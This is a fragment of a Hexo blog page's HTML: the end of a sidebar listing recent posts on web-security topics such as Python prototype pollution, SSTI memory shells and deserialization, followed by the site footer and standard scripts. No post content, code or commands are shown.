title="python原型链污染">python原型链污染</a><time datetime="2025-11-25T12:47:32.000Z" title="发表于 2025-11-25 20:47:32">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/17/GAN-%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90/" title="GAN_代码生成"><img src="https://p111223.github.io/imgs/2025-05-01 005434.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="GAN_代码生成"/></a><div class="content"><a class="title" href="/2025/10/17/GAN-%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90/" title="GAN_代码生成">GAN_代码生成</a><time datetime="2025-10-17T07:05:24.000Z" title="发表于 2025-10-17 15:05:24">2025-10-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/25/ssti%E5%86%85%E5%AD%98%E9%A9%AC/" title="ssti内存马"><img src="https://p111223.github.io/imgs/2025-05-01 010058.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ssti内存马"/></a><div class="content"><a class="title" href="/2025/09/25/ssti%E5%86%85%E5%AD%98%E9%A9%AC/" title="ssti内存马">ssti内存马</a><time datetime="2025-09-25T02:40:29.000Z" title="发表于 2025-09-25 10:40:29">2025-09-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="反序列化"><img src="https://p111223.github.io/imgs/2025-05-19 230455.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="反序列化"/></a><div class="content"><a class="title" href="/2025/06/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="反序列化">反序列化</a><time datetime="2025-06-17T11:59:15.000Z" title="发表于 2025-06-17 19:59:15">2025-06-17</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://p111223.github.io/imgs/2025-04-29 212727.png);"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2026 By mervin</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>